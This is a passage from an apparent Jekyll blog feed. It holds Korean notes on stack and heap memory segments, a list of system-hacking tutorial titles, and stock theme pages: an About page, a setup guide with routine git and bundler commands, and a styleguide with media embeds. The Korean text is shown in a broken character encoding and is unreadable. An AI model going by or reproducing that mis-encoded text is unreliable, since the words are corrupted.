        &lt;li&gt;í”„ë¡œê·¸ë¨ì˜ ì½”ë“œ í”Œë¡œìš°ë¥¼ ì •í™•íˆ ì˜ˆì¸¡í•˜ëŠ” ê±´ ë¶ˆê°€ëŠ¥í•˜ë¯€ë¡œ, ìŠ¤íƒë„ ê°€ë³€ì ìœ¼ë¡œ í• ë‹¹ë¨.
          &lt;ul&gt;
            &lt;li&gt;ì‘ì€ í¬ê¸°ì˜ ìŠ¤íƒ ì„¸ê·¸ë¨¼íŠ¸ë¥¼ ë¨¼ì € í• ë‹¹í•´ ì£¼ê³ , ë¶€ì¡±í•´ì§€ë©´ í™•ì¥.&lt;/li&gt;
            &lt;li&gt;â€œì•„ë˜ë¡œ ìë€ë‹¤â€: ë†’ì€ ì£¼ì†Œâ†’ë‚®ì€ ì£¼ì†Œë¡œ í™•ì¥.&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;heap-segment&quot;&gt;â€œHeap Segmentâ€&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;í™ ë°ì´í„°ê°€ ìœ„ì¹˜í•˜ëŠ” ì„¸ê·¸ë¨¼íŠ¸. ë©”ëª¨ë¦¬ í• ë‹¹ ì‹œ í• ë‹¹ëœ ë©”ëª¨ë¦¬ê°€ ì €ì¥ëœë‹¤.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;READ + WRITE&lt;/li&gt;
    &lt;li&gt;ìŠ¤íƒê³¼ ë™ì¼í•˜ê²Œ ì‹¤í–‰ì¤‘ì— ë™ì ìœ¼ë¡œ í• ë‹¹ëœë‹¤.&lt;/li&gt;
    &lt;li&gt;ë¦¬ëˆ…ìŠ¤ì—ì„œëŠ” ìŠ¤íƒ ì„¸ê·¸ë¨¼íŠ¸ì™€ ë°˜ëŒ€ ë°©í–¥ìœ¼ë¡œ ìë€ë‹¤: ë‚®ì€ ì£¼ì†Œ â†’ ë†’ì€ ì£¼ì†Œë¡œ í™•ì¥.&lt;/li&gt;
    &lt;li&gt;í• ë‹¹ëœ ë©”ëª¨ë¦¬ê°€ ì €ì¥ëœë‹¤: Cì–¸ì˜ ê²½ìš° malloc(), calloc()ë“±ìœ¼ë¡œ í• ë‹¹ë°›ì€ ë©”ëª¨ë¦¬ê°€ ì €ì¥ëœë‹¤.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;Q. í™ê³¼ ìŠ¤íƒ ì„¸ê·¸ë¨¼íŠ¸ê°€ ìë¼ëŠ” ë°©í–¥ì´ ë°˜ëŒ€ì¸ ì´ìœ ?&lt;/p&gt;

&lt;p&gt;A. ë™ì¼í•˜ë©´ ì¶©ëŒí•˜ë‹ˆê¹Œ. ë”°ë¼ì„œ ë¦¬ëˆ…ìŠ¤ëŠ” ìŠ¤íƒ ë² ì´ìŠ¤ë¥¼ ë©”ëª¨ë¦¬ ëì— ìœ„ì¹˜ì‹œí‚¤ê³  í™ ë² ì´ìŠ¤ëŠ” ë‚®ì€ ì£¼ì†Œì— ìœ„ì¹˜ì‹œì¼œì„œ ì¶©ëŒí•  ì¼ì´ ê±°ì˜ ì—†ê²Œ ë§Œë“¤ì–´ ë†¨ìŒ.&lt;/p&gt;
</description>
        <pubDate>Thu, 23 Jun 2022 12:24:23 +0900</pubDate>
        <link>http://localhost:4000/blog/system-hacking-step2/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system-hacking-step2/</guid>
      </item>
    

    
      
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
      
        
          <item>
            <title>About</title>
            <description>&lt;p&gt;This is the base Jekyll theme. You can find out more info about customizing your Jekyll theme, as well as basic Jekyll usage documentation at &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;jekyllrb.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can find the source code for Minima at GitHub:
&lt;a href=&quot;https://github.com/jekyll&quot;&gt;jekyll&lt;/a&gt; /
&lt;a href=&quot;https://github.com/jekyll/minima&quot;&gt;minima&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can find the source code for Jekyll at GitHub:
&lt;a href=&quot;https://github.com/jekyll&quot;&gt;jekyll&lt;/a&gt; /
&lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;jekyll&lt;/a&gt;&lt;/p&gt;

</description>
            <link>http://localhost:4000/about/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title></title>
            <description>&lt;h3&gt;   &lt;/h3&gt;

&lt;div id=&quot;categories&quot;&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#System Hacking Basic&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/System Hacking Basic&quot;&gt;System Hacking Basic&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;System Hacking Basic&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/protostar-stack5-x86-x64/&quot;&gt;Protostar-stack5.c x86 &amp;amp; x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step5-3/&quot;&gt;System Hackig Step 5-3&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step5-2/&quot;&gt;System Hackig Step 5-2&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step5/&quot;&gt;System Hackig Step 5&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step4-2&quot;&gt;System Hackig Step 4-2: Shell_basic&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step4&quot;&gt;System Hackig Step 4&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step3-2/&quot;&gt;System Hackig Step 3-2&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step3-1/&quot;&gt;System Hackig Step 3-1&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step2-2/&quot;&gt;System Hackig Step 2-2&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step2/&quot;&gt;System Hackig Step 2&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

&lt;/div&gt;

</description>
            <link>http://localhost:4000/blog/categories/</link>
          </item>
        
      
    
      
    
      
    
      
        
          <item>
            <title>Guides</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.guides %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>http://localhost:4000/blog/categories/guides/</link>
          </item>
        
      
    
      
    
      
    
      
    
      
    
      
        
          <item>
            <title>Get Started</title>
            <description>## Getting Started - How to use â€œdevlopr-jekyllâ€ theme

## What&apos;s Jekyll ?

If you arenâ€™t familiar with Jekyll yet, you should know that it is a static site generator. It will transform your plain text into static websites and blogs. No more databases, slow loading websites, risk of being hackedâ€¦just your content. And not only that, with Jekyll you get free hosting with GitHub Pages! If you are a beginner we recommend you start with [Jekyllâ€™s Docs](https://jekyllrb.com/docs/installation/). Now, if you know how to use Jekyll, letâ€™s move on to using this theme in Jekyll:

## Watch Tutorial

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/cXBEfpn0qrg?rel=0&amp;amp;controls=0&amp;amp;showinfo=0&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;


### Steps to create your blog using devlopr-jekyll and Host using Github Pages :

&gt;  **Step 1.**  Fork the repo - [click here](https://github.com/sujaykundu777/devlopr-jekyll/fork)

![Devlopr Jekyll Repo](/assets/img/posts/fork1.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 2.** Use **your-github-username.github.io** as the new repo  ( Replace your-github-username with yours). Remember if you use the name other than your-github-username.github.io , your blog will be built using gh-pages branch.

![Devlopr Jekyll Repo](/assets/img/posts/fork2.PNG){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork3.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 3.** Clone the new repo locally to make changes :

![Devlopr Jekyll Repo](/assets/img/posts/fork31.PNG){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork32.PNG){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork33.PNG){:class=&quot;img-fluid&quot;}

```bash
 $ git clone https://github.com/yourusername/yourusername.github.io
 $ cd yourusername.github.io
 $ code .
```

&gt; **Step 4.** Open the files using VSCode and edit _config.yml and edit with your details:

- _config.yml file - replace with your own details
- _posts - Add your blog posts here
- _includes - You can replace the contents of the files with your data. (contains widgets)
- _assets/img - Add all your images here

![Devlopr Jekyll Repo](/assets/img/posts/fork34.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 5** - Install the development requirements:

### Set up local development environment

1. [Git](https://git-scm.com/)
2. [Ruby](https://www.ruby-lang.org/) and [Bundler](https://bundler.io/)
3. [VSCode](https://code.visualstudio.com/download)

We need ruby and bundler to build our site locally. After installation check if its working:

For ruby :

```bash
$ ruby -v
ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-linux-gnu]
```
For bundler :

```bash
$ gem install bundler
$ bundler -v
Bundler version 2.2.29
```
Add jekyll :

```bash
$ bundle update
$ bundle add jekyll
```
 This command will add the Jekyll gem to our Gemfile and install it to the ./vendor/bundle/ folder.

You can check the jekyll version

```
$ bundle exec jekyll -v
jekyll 4.2.0
```

&gt; **Step 6.** Install the gem dependencies by running the following command

```bash
$ bundle update
$ bundle install
```

&gt; **Step 7.** Serve the site locally by running the following command below:

```bash
$ bundle exec jekyll serve --watch
```
or you can also serve using :

```bash
$ jekyll serve
```

Visit [http://localhost:4000](http://localhost:4000) for development server

![Devlopr Jekyll Repo](/assets/img/posts/fork41.PNG){:class=&quot;img-fluid&quot;}


### Adding Content

Start populating your blog by adding your .md files in _posts. devlopr-jekyll already has a few examples.

#### YAML Post Example:

```yml
---
layout: post
title: Sample Post
author: Sujay Kundu
date: &apos;2019-05-21 14:35:23 +0530&apos;
category:
        - jekyll
summary: This is the summary for the sample post
thumbnail: sample.png
---

Hi ! This is sample post.

```

#### YAML Page Example:

```yml
---
layout: page
title: Sample Page
permalink: /sample-page/
---

Hi ! This is sample page.
```

#### Editing stylesheet

Youâ€™ll only work with a single file to edit/add theme style: assets/css/main.scss.

### Deploy your Changes

Once happy with your blog changes. Push your changes to master branch.

&gt; **Step 8.** Push Your Local Changes

```bash
 $ git add .
 $ git commit -m &quot;my new blog using devlopr-jekyll&quot;
 $ git push origin master
```

Visit your Github Repo settings ! Enable master branch as Github Pages Branch :

![Devlopr Jekyll Repo](/assets/img/posts/fork6.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 9.** Deploy your Blog :

![Devlopr Jekyll Repo](/assets/img/posts/fork7.PNG){:class=&quot;img-fluid&quot;}

&gt; Congrats ! On your new shining Blog !

You can visit the blog using [http://your-github-username.github.io](http://your-github-username.github.io).

</description>
            <link>http://localhost:4000/get-started/</link>
          </item>
        
      
    
      
    
      
    
      
        
          <item>
            <title>Guides</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.sample_category %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>http://localhost:4000/blog/categories/sample_category/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title>Our Sponsors</title>
            <description>Thanks to all the amazing contributors and our Backers for the support.

- [Dirish Mohan](https://dirishmohan.com)</description>
            <link>http://localhost:4000/sponsors/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Styleguide</title>
            <description>### devlopr - Styleguide

&lt;hr /&gt;

 &lt;img src=&quot;/assets/img/styleguide.png&quot; class=&quot;img-fluid&quot;&gt;

&lt;p&gt; Lets try the different text styles  &lt;b&gt; Bold &lt;/b&gt; , &lt;strong&gt; Strong &lt;/strong&gt;, &lt;em&gt; Emphasis &lt;/em&gt;, &lt;i&gt; Italic &lt;/i&gt; &lt;/p&gt;


&lt;p&gt; Now, lets try different heading styles : &lt;/p&gt;

&lt;h1&gt; Hello in h1 ! &lt;/h1&gt;
&lt;h2&gt; Hello in h2 ! &lt;/h2&gt;
&lt;h3&gt; Hello in h3 ! &lt;/h3&gt;
&lt;h4&gt; Hello in h4 ! &lt;/h4&gt;
&lt;h5&gt; Hello in h5 ! &lt;/h5&gt;
&lt;h6&gt; Hello in h6 ! &lt;/h6&gt;

&lt;hr /&gt;
&lt;p&gt; Unordered List &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt; List Item 1 &lt;/li&gt;
&lt;li&gt; List Item 2 &lt;/li&gt;
&lt;li&gt; List Item 3 &lt;/li&gt;
&lt;li&gt; List Item 4 &lt;/li&gt;
&lt;li&gt; List Item 5 &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt; Ordered List &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt; List Item 1 &lt;/li&gt;
&lt;li&gt; List Item 2 &lt;/li&gt;
&lt;li&gt; List Item 3 &lt;/li&gt;
&lt;li&gt; List Item 4 &lt;/li&gt;
&lt;li&gt; List Item 5 &lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
&lt;p&gt;This is a Block Quote,  It can Expand Multiple Lines &lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;You can use the mark tag to &lt;mark&gt;highlight&lt;/mark&gt; text. &lt;/p&gt;

&lt;p&gt;&lt;del&gt; This line of text is meant to be deleted text &lt;/del&gt; &lt;/p&gt;

&lt;p&gt;&lt;u&gt;This line of text will render as underlined&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;&lt;small&gt;This line of text is meant to be treated as fine print.&lt;/small&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;This line rendered as bold text.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This line rendered as italicized text.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;abbr title=&quot;attribute&quot;&gt;attr&lt;/abbr&gt;&lt;/p&gt;
&lt;p&gt;&lt;abbr title=&quot;HyperText Markup Language&quot; class=&quot;initialism&quot;&gt;HTML&lt;/abbr&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;div class=&quot;responsive-table&quot;&gt;
&lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;col&quot;&gt;#&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;row&quot;&gt;1&lt;/th&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;row&quot;&gt;2&lt;/th&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;row&quot;&gt;3&lt;/th&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
    &lt;/div&gt;

&lt;hr /&gt;

&lt;h3&gt; Instagram Embed &lt;/h3&gt;

&lt;blockquote class=&quot;instagram-media&quot; data-instgrm-captioned data-instgrm-permalink=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; data-instgrm-version=&quot;13&quot; style=&quot; background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:540px; min-width:326px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);&quot;&gt;&lt;div style=&quot;padding:16px;&quot;&gt; &lt;a href=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; style=&quot; background:#FFFFFF; line-height:0; padding:0 0; text-align:center; text-decoration:none; width:100%;&quot; target=&quot;_blank&quot;&gt; &lt;div style=&quot; display: flex; flex-direction: row; align-items: center;&quot;&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; flex-grow: 0; height: 40px; margin-right: 14px; width: 40px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: column; flex-grow: 1; justify-content: center;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; margin-bottom: 6px; width: 100px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; width: 60px;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;padding: 19% 0;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display:block; height:50px; margin:0 auto 12px; width:50px;&quot;&gt;&lt;svg width=&quot;50px&quot; height=&quot;50px&quot; viewBox=&quot;0 0 60 60&quot; version=&quot;1.1&quot; xmlns=&quot;https://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;https://www.w3.org/1999/xlink&quot;&gt;&lt;g stroke=&quot;none&quot; stroke-width=&quot;1&quot; fill=&quot;none&quot; fill-rule=&quot;evenodd&quot;&gt;&lt;g transform=&quot;translate(-511.000000, -20.000000)&quot; fill=&quot;#000000&quot;&gt;&lt;g&gt;&lt;path d=&quot;M556.869,30.41 C554.814,30.41 553.148,32.076 553.148,34.131 C553.148,36.186 554.814,37.852 556.869,37.852 C558.924,37.852 560.59,36.186 560.59,34.131 C560.59,32.076 558.924,30.41 556.869,30.41 M541,60.657 C535.114,60.657 530.342,55.887 530.342,50 C530.342,44.114 535.114,39.342 541,39.342 C546.887,39.342 551.658,44.114 551.658,50 C551.658,55.887 546.887,60.657 541,60.657 M541,33.886 C532.1,33.886 524.886,41.1 524.886,50 C524.886,58.899 532.1,66.113 541,66.113 C549.9,66.113 557.115,58.899 557.115,50 C557.115,41.1 549.9,33.886 541,33.886 M565.378,62.101 C565.244,65.022 564.756,66.606 564.346,67.663 C563.803,69.06 563.154,70.057 562.106,71.106 C561.058,72.155 560.06,72.803 558.662,73.347 C557.607,73.757 556.021,74.244 553.102,74.378 C549.944,74.521 548.997,74.552 541,74.552 C533.003,74.552 532.056,74.521 528.898,74.378 C525.979,74.244 524.393,73.757 523.338,73.347 C521.94,72.803 520.942,72.155 519.894,71.106 C518.846,70.057 518.197,69.06 517.654,67.663 C517.244,66.606 516.755,65.022 516.623,62.101 C516.479,58.943 516.448,57.996 516.448,50 C516.448,42.003 516.479,41.056 516.623,37.899 C516.755,34.978 517.244,33.391 517.654,32.338 C518.197,30.938 518.846,29.942 519.894,28.894 C520.942,27.846 521.94,27.196 523.338,26.654 C524.393,26.244 525.979,25.756 528.898,25.623 C532.057,25.479 533.004,25.448 541,25.448 C548.997,25.448 549.943,25.479 553.102,25.623 C556.021,25.756 557.607,26.244 558.662,26.654 C560.06,27.196 561.058,27.846 562.106,28.894 C563.154,29.942 563.803,30.938 564.346,32.338 C564.756,33.391 565.244,34.978 565.378,37.899 C565.522,41.056 565.552,42.003 565.552,50 C565.552,57.996 565.522,58.943 565.378,62.101 M570.82,37.631 C570.674,34.438 570.167,32.258 569.425,30.349 C568.659,28.377 567.633,26.702 565.965,25.035 C564.297,23.368 562.623,22.342 560.652,21.575 C558.743,20.834 556.562,20.326 553.369,20.18 C550.169,20.033 549.148,20 541,20 C532.853,20 531.831,20.033 528.631,20.18 C525.438,20.326 523.257,20.834 521.349,21.575 C519.376,22.342 517.703,23.368 516.035,25.035 C514.368,26.702 513.342,28.377 512.574,30.349 C511.834,32.258 511.326,34.438 511.181,37.631 C511.035,40.831 511,41.851 511,50 C511,58.147 511.035,59.17 511.181,62.369 C511.326,65.562 511.834,67.743 512.574,69.651 C513.342,71.625 514.368,73.296 516.035,74.965 C517.703,76.634 519.376,77.658 521.349,78.425 C523.257,79.167 525.438,79.673 528.631,79.82 C531.831,79.965 532.853,80.001 541,80.001 C549.148,80.001 550.169,79.965 553.369,79.82 C556.562,79.673 558.743,79.167 560.652,78.425 C562.623,77.658 564.297,76.634 565.965,74.965 C567.633,73.296 568.659,71.625 569.425,69.651 C570.167,67.743 570.674,65.562 570.82,62.369 C570.966,59.17 571,58.147 571,50 C571,41.851 570.966,40.831 570.82,37.631&quot;&gt;&lt;/path&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div style=&quot;padding-top: 8px;&quot;&gt; &lt;div style=&quot; color:#3897f0; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:550; line-height:18px;&quot;&gt; View this post on Instagram&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;padding: 12.5% 0;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: row; margin-bottom: 14px; align-items: center;&quot;&gt;&lt;div&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; height: 12.5px; width: 12.5px; transform: translateX(0px) translateY(7px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot;background-color: #F4F4F4; height: 12.5px; transform: rotate(-45deg) translateX(3px) translateY(1px); width: 12.5px; flex-grow: 0; margin-right: 14px; margin-left: 2px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; height: 12.5px; width: 12.5px; transform: translateX(9px) translateY(-18px);&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;margin-left: 8px;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 50%; flex-grow: 0; height: 20px; width: 20px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; width: 0; height: 0; border-top: 2px solid transparent; border-left: 6px solid #f4f4f4; border-bottom: 2px solid transparent; transform: translateX(16px) translateY(-4px) rotate(30deg)&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;margin-left: auto;&quot;&gt; &lt;div style=&quot; width: 0px; border-top: 8px solid #F4F4F4; border-right: 8px solid transparent; transform: translateY(16px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; flex-grow: 0; height: 12px; width: 16px; transform: translateY(-4px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot; width: 0; height: 0; border-top: 8px solid #F4F4F4; border-left: 8px solid transparent; transform: translateY(-4px) translateX(8px);&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: column; flex-grow: 1; justify-content: center; margin-bottom: 24px;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; margin-bottom: 6px; width: 224px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; width: 144px;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;p style=&quot; color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;&quot;&gt;&lt;a href=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; style=&quot; color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;&quot; target=&quot;_blank&quot;&gt;A post shared by Sujay (@sujaykundu777)&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt; &lt;script async src=&quot;//www.instagram.com/embed.js&quot;&gt;&lt;/script&gt;

&lt;hr&gt;

&lt;h3&gt; Twitter Embed &lt;/h3&gt;

&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;en&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;I just published â€œDeploying a blog using Jekyll and Github Pages with SSL certificate for Freeâ€ &lt;a href=&quot;https://t.co/B3T3IQVU93&quot;&gt;https://t.co/B3T3IQVU93&lt;/a&gt;&lt;/p&gt;&amp;mdash; Sujay Kundu (@SujayKundu777) &lt;a href=&quot;https://twitter.com/SujayKundu777/status/1012601950469160962?ref_src=twsrc%5Etfw&quot;&gt;June 29, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

&lt;hr /&gt;


&lt;h3&gt;YouTube Responsive Embed&lt;/h3&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/bBpKMH3nBzE?rel=0&amp;amp;controls=0&amp;amp;showinfo=0&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3&gt;Vimeo Responsive Embed&lt;/h3&gt;

&lt;iframe src=&quot;https://player.vimeo.com/video/212114694?title=0&amp;amp;byline=0&amp;amp;portrait=0&quot; width=&quot;640&quot; height=&quot;360&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;ted-responsive-embed&quot;&gt;TED Responsive Embed&lt;/h3&gt;

&lt;iframe src=&quot;https://embed.ted.com/talks/ted_halstead_a_climate_solution_where_all_sides_can_win&quot; width=&quot;640&quot; height=&quot;360&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;twitch-responsive-embed&quot;&gt;Twitch Responsive Embed&lt;/h3&gt;

